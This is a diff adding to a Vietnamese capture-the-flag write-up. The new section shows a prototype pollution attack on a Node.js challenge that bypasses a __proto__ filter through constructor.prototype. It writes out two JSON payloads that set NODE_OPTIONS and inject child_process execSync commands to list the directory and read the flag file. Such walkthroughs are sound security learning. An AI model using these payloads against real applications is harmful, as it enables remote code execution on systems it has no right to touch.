@@ -324,4 +324,33 @@ Hàm này có chức năng clone object, nếu object chứa key là `__proto__`
 
 Đoạn code trên có chức năng kiểm tra điểm của người đó xem có đỗ hay là không, nếu không đỗ thì sẽ trả vể kết quả gồm `n` + 10 ký tự `oO` random + `pe`, nếu đỗ sẽ trả về `Passed`. Nhìn chung ở đây không có lỗ hổng
 
+Ờ bài này còn có một chức năng khác khi ta truy cập vào `/debug/:action`, ta sẽ xem code ở chức năng này
+
+![image](https://user-images.githubusercontent.com/86275419/229121269-30f3794b-1e28-4d78-b23a-18647401117a.png)
+
+Ở đây ta có thể chắc chắn rằng bài này có thể RCE thông qua lỗ hổng `Prototype pollution` vì ở trong chức năng này có một hàm có thể tạo `child_process` đó là `fork`. 
+
+Vì trong bài này đã filter khi ta sử dụng `__proto__` nhưng ta vẫn còn một cách khác để truy cập vào `Object.prototype` đó là thông qua `constructor.prototype` 
+
+Giờ ta chỉ cần lên [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype) lấy payload về và chạy thôi. Mọi người lưu ý là do payload ở hacktricks nằm trong dấu `'` nên khi sử dụng ta phải bỏ hai dấu `\\` ở `\\\"` để nó khỏi convert thành `\"`
+
+Lúc đầu mình thử cat flag ra luôn nhưng không được nên phải list thư mục ra xem 
+
+`{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").execSync(\"ls\").toString())//"}}}}`
+
+![image](https://user-images.githubusercontent.com/86275419/229122951-28a7040a-8ac3-436f-bbf6-259a9c09fc2b.png)
+
+Kết quả
+
+![image](https://user-images.githubusercontent.com/86275419/229122996-ac73bc22-0255-4406-a762-b809343903c5.png)
+
+File flag là `flag_e1T6f`, đã có tên file giờ ta sẽ cat ra và lấy flag thôi
+
+`{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").execSync(\"cat flag_e1T6f\").toString())//"}}}}`
+
+![image](https://user-images.githubusercontent.com/86275419/229123302-ebee915e-8ff1-4eb5-ba08-059474d7d988.png)
+
+Kết quả 
+
+![image](https://user-images.githubusercontent.com/86275419/229123466-5123ccbd-fd2b-4886-bdbd-7479d0d6c7ae.png)
 
